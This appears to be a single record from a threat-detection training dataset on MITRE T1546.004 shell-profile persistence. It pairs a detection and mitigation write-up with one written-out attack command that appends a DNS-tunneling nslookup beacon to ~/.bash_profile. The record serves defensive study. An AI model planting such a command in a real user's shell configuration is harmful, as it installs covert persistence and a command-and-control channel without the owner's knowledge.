---
type: campaign
scenario_id: 488
tactic: Persistence
technique: "T1546.004: Unix Shell Configuration Modification"
technique_id: T1546.004
tags: [campaign, lotl, persistence]
---

# Adding DNS tunneling script to bash_profile for persistence.

## Threat Description
Adding DNS tunneling script to bash_profile for persistence.

## Attack Command
```
echo "nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null" >> ~/.bash_profile
```

## Detection Logic
Monitor bash_profile changes: `cat ~/.bash_profile | grep nslookup | grep TXT`; Audit file changes: `auditctl -w ~/.bash_profile -p wa`.

## Mitigation
Restrict bash_profile writes: `chmod 600 ~/.bash_profile`; Monitor shell configuration changes.

## AI Training Prompt
Train AI to detect DNS tunneling persistence in bash_profile by analyzing nslookup TXT commands, base64-encoded subdomains, and file modifications; suggest file protections.

## References
- MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
